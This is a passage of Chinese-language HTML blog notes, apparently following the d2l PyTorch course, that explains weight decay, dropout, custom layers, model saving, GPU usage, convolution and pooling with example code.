class="line">updater = torch.optim.SGD(params, lr=lr)</span><br><span class="line"><span class="comment">#训练</span></span><br><span class="line">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, updater)</span><br><span class="line"></span><br><span class="line">d2l.predict_ch3(net, test_iter)</span><br></pre></td></tr></table></figure><h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><h3 id="权重衰退"><a href="#权重衰退" class="headerlink" title="权重衰退"></a>权重衰退</h3><p>主要为了在一定程度上解决过拟合问题，调整模型的复杂度。一种简单的方法是在损失函数中添加参数的L2范数,即</p><script type="math/tex; mode=display">L(\mathbf{w},b) +\frac{\lambda}{2} ||\mathbf{w}||^2</script><p>其中L2的范数即向量每个分量的平方和。计算梯度进行参数更新如下</p><script type="math/tex; mode=display">\frac{\partial{}}{\partial{\mathbf{w}}} (L(\mathbf{w},b) +\frac{\lambda}{2} ||\mathbf{w}||^2) = \frac{\partial{L(\mathbf{w},b)}}{\partial{\mathbf{w}}} +\lambda \mathbf{w}</script><p>更新参数</p><script type="math/tex; mode=display">w \leftarrow w-\eta \frac{\partial{}}{\partial{\mathbf{w}}} (L(\mathbf{w},b) +\frac{\lambda}{2} ||\mathbf{w}||^2) =(1-\eta\lambda) w- \eta \frac{\partial{L(\mathbf{w},b)}}{\partial{\mathbf{w}}}</script><p>使用torch的实现方式如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里问题的维数为200维，但是训练集只包含20个样本</span></span><br><span class="line">n_train, n_test, num_inputs, batch_size = <span class="number">20</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">5</span></span><br><span class="line">true_w, true_b = torch.ones((num_inputs, <span class="number">1</span>)) * <span class="number">0.01</span>, <span class="number">0.05</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成y=Xw+b+noise的训练数据</span></span><br><span class="line">train_data = d2l.synthetic_data(true_w, true_b, n_train)</span><br><span class="line">train_iter = d2l.load_array(train_data, batch_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成测试数据</span></span><br><span class="line">test_data = d2l.synthetic_data(true_w, true_b, n_test)</span><br><span class="line">test_iter = d2l.load_array(test_data, batch_size, is_train=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化模型参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_params</span>():</span></span><br><span class="line">    w = torch.normal(<span class="number">0</span>, <span class="number">1</span>, size=(num_inputs, <span class="number">1</span>), requires_grad=<span class="literal">True</span>)</span><br><span class="line">    b = torch.zeros(<span class="number">1</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [w, b]</span><br><span class="line"></span><br><span class="line"><span class="comment">#L2范数惩罚</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l2_penalty</span>(<span class="params">w</span>):</span></span><br><span class="line">    <span class="keyword">return</span> torch.sum(w.pow(<span class="number">2</span>)) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">lambd</span>):</span></span><br><span class="line">    w, b = init_params()</span><br><span class="line">    <span class="comment">#线性模型</span></span><br><span class="line">    net, loss = <span class="keyword">lambda</span> X: d2l.linreg(X, w, b), d2l.squared_loss</span><br><span class="line">    num_epochs, lr = <span class="number">100</span>, <span class="number">0.003</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> range(num_epochs):</span><br><span class="line">        <span class="keyword">for</span> X, y <span class="keyword">in</span> train_iter:</span><br><span class="line">            <span class="comment"># 增加了L2范数惩罚项，</span></span><br><span class="line">            <span class="comment"># 广播机制使l2_penalty(w)成为一个长度为batch_size的向量</span></span><br><span class="line">            l = loss(net(X), y) + lambd * l2_penalty(w)</span><br><span class="line">            l.sum().backward()</span><br><span class="line">            <span class="comment">#梯度更新参数</span></span><br><span class="line">            d2l.sgd([w, b], lr, batch_size)</span><br><span class="line">        <span class="keyword">if</span> (epoch + <span class="number">1</span>) % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">&#x27;w的L2范数是：&#x27;</span>, torch.norm(w).item())</span><br></pre></td></tr></table></figure><h3 id="暂退法"><a href="#暂退法" class="headerlink" title="暂退法"></a>暂退法</h3><p>其主要思想是:</p><ul><li><p>1.在每次迭代中,随机选择一部分神经元,暂时不让其激活,即dropout。</p></li><li><ol><li>剩下的神经元则需要完成原任务,避免过拟合。</li></ol></li><li><ol><li>每次迭代dropout的节点不同,强迫整个网络协作,避免对特定节点的依赖。</li></ol></li><li><ol><li>在预测时则不使用dropout。</li></ol></li></ul><p><img src="https://s2.loli.net/2024/08/11/tLQyTo7FHO2E4hf.png" alt="image-20240811154915491"></p><p>其简洁实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mport torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line">net = nn.Sequential(nn.Flatten(),</span><br><span class="line">        nn.Linear(<span class="number">784</span>, <span class="number">256</span>),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        <span class="comment"># 在第一个全连接层之后添加一个dropout层</span></span><br><span class="line">        nn.Dropout(dropout1),</span><br><span class="line">        nn.Linear(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        <span class="comment"># 在第二个全连接层之后添加一个dropout层</span></span><br><span class="line">        nn.Dropout(dropout2),</span><br><span class="line">        nn.Linear(<span class="number">256</span>, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_weights</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">if</span> type(m) == nn.Linear:</span><br><span class="line">        nn.init.normal_(m.weight, std=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">net.apply(init_weights);</span><br><span class="line">trainer = torch.optim.SGD(net.parameters(), lr=lr)</span><br><span class="line">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)</span><br></pre></td></tr></table></figure><h2 id="一些常用的深度学习API组件使用"><a href="#一些常用的深度学习API组件使用" class="headerlink" title="一些常用的深度学习API组件使用"></a>一些常用的深度学习API组件使用</h2><h3 id="自定义层和块"><a href="#自定义层和块" class="headerlink" title="自定义层和块"></a>自定义层和块</h3><p>层类似多层感知机的层一样，而块可以描述单个层、由多个层组成的组件或整个模型本身。一个块甚至可能由多个块组成(套娃)</p><p>每个块的子类必须定义一个<code>前向传播函数</code>,描述一个将输入转换为输出的过程。我们自定义一个块的时候，必须提供一些基本功能</p><ul><li>将输入数据作为其前向传播函数的参数</li><li>通过前向传播函数来生成输出</li><li>计算其输出关于输入的梯度，可通过其反向传播函数进行访问。</li><li>存储和访问前向传播计算所需的参数。</li><li>根据需要初始化模型参数。</li></ul><p>例如如下编码实现的一个块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MLP</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="comment"># 用模型参数声明层。这里，我们声明两个全连接的层</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 调用MLP的父类Module的构造函数来执行必要的初始化。</span></span><br><span class="line">        <span class="comment"># 这样，在类实例化时也可以指定其他函数参数，例如模型参数params（稍后将介绍）</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.hidden = nn.Linear(<span class="number">20</span>, <span class="number">256</span>)  <span class="comment"># 隐藏层</span></span><br><span class="line">        self.out = nn.Linear(<span class="number">256</span>, <span class="number">10</span>)  <span class="comment"># 输出层</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义模型的前向传播，即如何根据输入X返回所需的模型输出</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        <span class="comment"># 注意，这里我们使用ReLU的函数版本，其在nn.functional模块中定义。</span></span><br><span class="line">        <span class="keyword">return</span> self.out(F.relu(self.hidden(X)))</span><br></pre></td></tr></table></figure><p>为了将多个块组合在一起，我们使用了Sequential类</p><p>其实现类似这样(这个是自定义的简化Sequential类)，在init函数中将参数中每个模块添加到列表_modules中，而在前向传播函数forward中，依次调用添加的块，然后进行计算，传递给下一个块计算，以此类推</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySequential</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        <span class="keyword">for</span> idx, module <span class="keyword">in</span> enumerate(args):</span><br><span class="line">            <span class="comment"># 这里，module是Module子类的一个实例。我们把它保存在&#x27;Module&#x27;类的成员</span></span><br><span class="line">            <span class="comment"># 变量_modules中。_module的类型是OrderedDict</span></span><br><span class="line">            self._modules[str(idx)] = module</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        <span class="comment"># OrderedDict保证了按照成员添加的顺序遍历它们</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> self._modules.values():</span><br><span class="line">            X = block(X)</span><br><span class="line">        <span class="keyword">return</span> X</span><br><span class="line">net = MySequential(nn.Linear(<span class="number">20</span>, <span class="number">256</span>), nn.ReLU(), nn.Linear(<span class="number">256</span>, <span class="number">10</span>))</span><br></pre></td></tr></table></figure><p>而自定义层的方法如下，主要是自己实现一个类，实现前向传播函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"></span><br><span class="line"><span class="comment">#不带参数的层</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CenteredLayer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        <span class="keyword">return</span> X - X.mean()</span><br><span class="line"><span class="comment"># 带参数的层</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinear</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_units, units</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.weight = nn.Parameter(torch.randn(in_units, units))</span><br><span class="line">        self.bias = nn.Parameter(torch.randn(units,))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        linear = torch.matmul(X, self.weight.data) + self.bias.data</span><br><span class="line">        <span class="keyword">return</span> F.relu(linear)</span><br></pre></td></tr></table></figure><h3 id="读写与存储"><a href="#读写与存储" class="headerlink" title="读写与存储"></a>读写与存储</h3><p>主要是保存模型参数。保存张量的参数方法类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MLP</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.hidden = nn.Linear(<span class="number">20</span>, <span class="number">256</span>)</span><br><span class="line">        self.output = nn.Linear(<span class="number">256</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.output(F.relu(self.hidden(x)))</span><br><span class="line"></span><br><span class="line">net = MLP()</span><br><span class="line">X = torch.randn(size=(<span class="number">2</span>, <span class="number">20</span>))</span><br><span class="line">Y = net(X)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存参数到mlp.params中</span></span><br><span class="line">torch.save(net.state_dict(), <span class="string">&#x27;mlp.params&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#从mlp.params中load参数</span></span><br><span class="line">clone = MLP()</span><br><span class="line">clone.load_state_dict(torch.load(<span class="string">&#x27;mlp.params&#x27;</span>))</span><br><span class="line">clone.eval()</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存张量</span></span><br><span class="line">x = torch.arange(<span class="number">4</span>)</span><br><span class="line">torch.save(x, <span class="string">&#x27;x-file&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load张量</span></span><br><span class="line">x2 = torch.load(<span class="string">&#x27;x-file&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="使用GPU"><a href="#使用GPU" class="headerlink" title="使用GPU"></a>使用GPU</h3><p>在pytorch中，使用<code>torch.device</code>函数来指定使用cpu或者gpu，后者采用<code>touch.device(f&#39;cuda:&#123;id&#125;&#39;)</code>的方式，<code>id</code>取决于你有几个GPU，使用哪块gpu。需要注意的是，我们需要保证存储在GPU上进行运算的两个参数位于同一个GPU上面，否则需要进行复制传递过去</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_gpu</span>(<span class="params">i=<span class="number">0</span></span>):</span>  <span class="comment">#@save</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;如果存在，则返回gpu(i)，否则返回cpu()&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> torch.cuda.device_count() &gt;= i + <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> torch.device(<span class="string">f&#x27;cuda:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> torch.device(<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line">X = torch.ones(<span class="number">2</span>, <span class="number">3</span>, device=try_gpu()) <span class="comment">#张量X存在第0块GPU中</span></span><br><span class="line">Y = torch.rand(<span class="number">2</span>, <span class="number">3</span>, device=try_gpu(<span class="number">1</span>))<span class="comment">#张量Y存在第1块GPU中</span></span><br><span class="line"></span><br><span class="line">Z = X.cuda(<span class="number">1</span>) <span class="comment">#复制到GPU1中，才能进行计算</span></span><br><span class="line">Y + Z</span><br></pre></td></tr></table></figure><p>类似的，可以将神经网络模型指定GPU,下列代码将模型参数放在GPU上面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net = nn.Sequential(nn.Linear(<span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line">net = net.to(device=try_gpu())</span><br></pre></td></tr></table></figure><p>这里顺便介绍一下GPU的工作原理</p><p>笔者曾经大二的时候打过ASC世界超算竞赛，当时学了一点GPU和并行计算的知识(不过现在已经基本上忘完了)</p><p>对比一下CPU和GPU的架构如下图所示(网图，侵删)</p><p><img src="https://s2.loli.net/2024/08/13/3GiCXvjgHh2aIW8.png" alt="image-20240813111428744"></p><p>可以看出来，GPU相较于CPU减少了cache，控制单元的部分，并且转向了使用大量的ALU还提高其计算能力和吞吐量。但是学过系统结构的我们知道，cache的存在解决了读写速度不匹配的问题。而GPU削减cache会在一定程度上导致高延迟(一部分时间耗在了IO读取上面)。那么GPU怎么解决这个问题并提供高性能的呢。其解决方法是使用大量线程和强大的计算能力，在延迟期间有效调度线程执行，从而提高性能。</p><p>GPU 由一系列   流式多处理器 (streaming multiprocessors (SM) ) 组成。每个 SM 又由多个流处理器或内核或线程组成。</p><p>每个SM有共享存储器，在所有内核当中共享，还有功能单元或其他计算单元。(感觉可以理解成一个丐版的CPU核心？)</p><p>SM的内存层次结构如下图所示(网图侵删)</p><p><img src="https://s2.loli.net/2024/08/13/QhUD9tvGfClipES.png" alt="image-20240813112639657"></p><p>其中</p><ul><li><code>register</code>就是寄存器，在内核当中共享，并根据线程要求动态分配。分配后是线程私有的。</li><li><code>Shared Memory</code> 共享内存，为运行在SM上的线程块共享。</li><li><code>Global Memory</code> 全局内存，所有SM共享，可以通过L2 cache进行缓存。</li><li><code>Constant caches</code>常量缓存，必须在代码中显示声明对象为常量才会缓存在其上面</li></ul><p>剩下得L1 cache和L2 cache和CPU的cache类似。</p><h2 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h2><p>卷积神经网络的一个切入点是<code>空间不变性</code>。举一个例子，如果我们想要训练一个模型来识别图片上的某些模式(比如识别一个人脸)，显然我们想要的结果是无论这张人脸在照片的左上角还是右下角,我们都应该正确识别。还有一个特点是<code>局部性</code>，解释为神经网络的前面几层应该只探索输入图像中的局部区域，而不过度在意图像中相隔较远区域的关系。我个人的理解是它主要应用于类似局部模式匹配，从某个平移窗口中search东西，而不是以整个照片为目标进行一个找的查。</p><p>如果将其用数学语言描述，输入是一个二维图像$\mathbf{X}$,隐藏表示为$\mathbf{H}$ ,他俩都是二位张量，具有相同的形状，而我们的权重$W$是一个<code>四阶张量</code>(很好理解,因为固定两维之后还剩两维去和输入进行假)，再加上我们的偏置矩阵$U$,则有对某个位置$(i,j)$的像素，有</p><script type="math/tex; mode=display">[\mathbf{H}]_{i,j} = [\mathbf{U}]_{i,j} + \sum_k\sum_l [\mathbf{W}]_{i,j,k,l}[\mathbf{X}]_{k,l} \\=[\mathbf{U}]_{i,j} + \sum_a\sum_b [\mathbf{V}]_{i,j,a,b}[\mathbf{X}]_{i+a,j+b}</script><p>等式也很好理解（《具体数学》的和式那节有提到处理和式的方法)，就是下表重新索引。对于平移不变性，意味着我们有$\mathbf{U},\mathbf{V}$ 不依赖于$(i,j)$的选择，则其可以定义为</p><script type="math/tex; mode=display">[\mathbf{H}]_{i,j} = u+\sum_a\sum_b[\mathbf{V}]_{a,b} [\mathbf{X}]_{i+a,j+b}</script><p>对局部性可以这样描述，在$|a| &gt;\Delta \or |b| &gt;\Delta \rightarrow [\mathbf{V}]_{a,b} = 0$ 。因此则有</p><script type="math/tex; mode=display">[\mathbf{H}]_{i,j} = u+\sum_{a=-\Delta}^{\Delta}\sum_{b=-\Delta} ^{\Delta}[\mathbf{V}]_{a,b} [\mathbf{X}]_{i+a,j+b}</script><p>$\mathbf{V}$被称为卷积核或者滤波器，或者是卷积层参数，是一个可学习的参数。这样卷积神经网络相较于多层感知机，其需要学习的参数大幅减少，得益于我们的平移不变性以及局部性。但是坏处是如果图像不满足平移不变的时候，模型可能难以拟合训练数据</p><h3 id="互相关运算"><a href="#互相关运算" class="headerlink" title="互相关运算"></a>互相关运算</h3><p>就是核函数在输入矩阵上面不断地平移窗口，作互相关运算，到输出矩阵。比如说蓝色区域有 19 = 0x0+1x1+3x2+4x3。以此类推</p><p><img src="https://s2.loli.net/2024/08/12/rdeQTjOvRaE2FnV.png" alt="image-20240812102906231"></p><p>其代码实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">corr2d</span>(<span class="params">X, K</span>):</span>  <span class="comment">#@save</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算二维互相关运算&quot;&quot;&quot;</span></span><br><span class="line">    h, w = K.shape</span><br><span class="line">    Y = torch.zeros((X.shape[<span class="number">0</span>] - h + <span class="number">1</span>, X.shape[<span class="number">1</span>] - w + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(Y.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(Y.shape[<span class="number">1</span>]):</span><br><span class="line">            Y[i, j] = (X[i:i + h, j:j + w] * K).sum()</span><br><span class="line">    <span class="keyword">return</span> Y</span><br></pre></td></tr></table></figure><p>所以我们可以构造卷积层的前向传播函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conv2D</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, kernel_size</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.weight = nn.Parameter(torch.rand(kernel_size))</span><br><span class="line">        self.bias = nn.Parameter(torch.zeros(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> corr2d(x, self.weight) + self.bias</span><br></pre></td></tr></table></figure><p>对于卷积层还有填充以及步幅等优化手段。</p><p>填充主要针对的是在应用多层卷积的时候，会丢失边缘像素。为了不丢失这些边缘像素，保持输入输出具有相同规模，我们对输入矩阵的四周进行填充(常常补0)，如下图所示</p><p><img src="https://s2.loli.net/2024/08/12/yIGuxpF3gq9oLaC.png" alt="image-20240812104637620"></p><p>回忆我们刚刚应用互相关时的过程，就是类似核函数在输入矩阵中一步一步的平移窗口，而此时步幅就是1.我们可以对步幅进行更改(分为水平步幅$s_w$和垂直步幅$s_h$)。这样得到的输出矩阵形状为($p_h$为垂直填充，$p_w$为水平填充)</p><script type="math/tex; mode=display">\lfloor (n_h-k_h+p_h+s_h)/s_h\rfloor *\lfloor (n_w-k_w+p_w+s_w)/s_w\rfloor</script><h3 id="汇聚层"><a href="#汇聚层" class="headerlink" title="汇聚层"></a>汇聚层</h3><p>汇聚层有两个目的</p><ul><li>降低卷积层对位置的敏感性</li><li>降低对空间降采样表示的敏感性</li></ul><p>和卷积层类似，汇聚层也是像滑动窗口一样，在输入的矩阵上面滑动进行运算。汇聚层不包含参数(区别于卷积层的核函数)。常见的汇聚层操作有<code>最大汇聚层</code>以及<code>平均汇聚层</code>。代表了在相应窗口取最大值或者平均值</p><p><img src="https://s2.loli.net/2024/08/12/dxvZzQoWFpUDO2j.png" alt="image-20240812163656153"></p><p>其代码实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pool2d</span>(<span class="params">X, pool_size, mode=<span class="string">&#x27;max&#x27;</span></span>):</span></span><br><span class="line">    p_h, p_w = pool_size</span><br><span class="line">    Y = torch.zeros((X.shape[<span class="number">0</span>] - p_h + <span class="number">1</span>, X.shape[<span class="number">1</span>] - p_w + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(Y.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(Y.shape[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line">                Y[i, j] = X[i: i + p_h, j: j + p_w].max()</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">&#x27;avg&#x27;</span>:</span><br><span class="line">                Y[i, j] = X[i: i + p_h, j: j + p_w].mean()</span><br><span class="line">    <span class="keyword">return</span> Y</span><br></pre></td></tr></table></figure><p>类似的，汇聚层也有类似卷积层那样填充或者改变步幅等操作。也能作用于多个通道</p><h3 id="LeNet"><a href="#LeNet" class="headerlink" title="LeNet"></a>LeNet</h3><p>LeNet构成示意图如下,其主要由两部分组成</p><ul><li>卷积编码器</li><li>全连接层密集块</li></ul><p><img src="https://s2.loli.net/2024/08/12/CJuTvtKUOwzEWD3.png" alt="image-20240812202154844"></p><p>一个卷积块(回忆我们之前学的块和层)基本单元是一个卷积层，一个sigmoid激活函数和一个平均汇聚层。</p><p>每个卷积核使用5*5的卷积核和一个sigmoid激活函数。第一卷积层有6个输出通道，第二个卷积层有16个输出通道。每个池操作是2*2的，步幅是2。用代码实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span 